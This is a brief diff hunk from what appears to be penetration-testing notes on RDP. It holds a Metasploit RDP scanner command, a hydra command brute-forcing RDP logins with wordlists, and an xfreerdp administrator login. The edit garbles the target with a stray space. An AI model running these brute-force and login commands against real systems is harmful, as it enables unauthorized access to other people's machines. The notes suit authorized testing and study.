@@ -24,5 +24,5 @@ $ mfsconsole use auxiliary/scanner/rdp/rdp_scanner
 # Brute force.
 $ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/linux_pass.txt rdp://target -s 3389
 
-$ xfreerdp /u:administrator /p:password123  /v:target:port
+$ xfreerdp /u:administrator /p:password123  /v:ta rget:port
 ```
